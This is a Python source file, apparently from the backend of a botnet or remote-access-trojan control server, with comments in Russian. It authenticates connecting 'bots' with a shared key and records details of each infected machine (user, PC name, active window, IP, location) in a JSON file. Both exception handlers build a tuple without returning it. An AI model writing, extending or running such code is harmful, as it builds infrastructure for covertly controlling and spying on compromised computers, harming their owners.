# backend/Services/Auth.py
import asyncio, json, logs.LoggerWrapper as logger, backend as cfg
from pathlib import Path

BOTS_FILE = Path(__file__).parent / "Bots_DB.txt"
REQUIRED_FIELDS = ['id', 'loc', 'user', 'pc_name', 'active_window', 'last_active', 'ip', 'auth_key']

async def authorize_client(reader, ip_address):
    """Авторизация бота и первичная запись в БД"""
    try:
        raw_len = await asyncio.wait_for(reader.readexactly(4), 10)
        packet_len = int.from_bytes(raw_len, "big")
        if not (0 < packet_len <= 65536): return None
        
        raw_data = await asyncio.wait_for(reader.readexactly(packet_len), 10)
        data = json.loads(raw_data.decode())
        
        if any(f not in data for f in REQUIRED_FIELDS) or data.get('auth_key') != cfg.AUTH_KEY: 
            return None
            
        # Если бот еще не знает свой IP, подставляем IP из сокета
        if data.get('ip') == "0.0.0.0": data['ip'] = ip_address
        
        bot_id = data.get('id')
        return bot_id, sync_bot_data(bot_id, data)
    except Exception as error: 
        (logger.Log.info(f"[!] Auth Error {ip_address}: {error}"), None)

def sync_bot_data(bot_id, payload):
    """Синхронизация: заменяем заглушки реальными данными"""
    try:
        db = json.loads(BOTS_FILE.read_text(encoding="utf-8")) if BOTS_FILE.exists() else {}
        clean = {k: v for k, v in payload.items() if k != 'auth_key'}
        
        if bot_id not in db: 
            db[bot_id] = clean
        else:
            for k, v in clean.items():
                # Обновляем, если в базе пусто/дефолт, либо пришло новое осмысленное значение
                current = db[bot_id].get(k)
                if current in [None, "", "??", "0.0.0.0", "Loading...", "Idle"] or v not in [None, "??", "0.0.0.0"]:
                    db[bot_id][k] = v
                    
        BOTS_FILE.write_text(json.dumps(db, indent=4, ensure_ascii=False), encoding="utf-8")
        return db[bot_id]
    except Exception as error: 
        (logger.Log.error(f"DB Sync Error: {error}"), payload)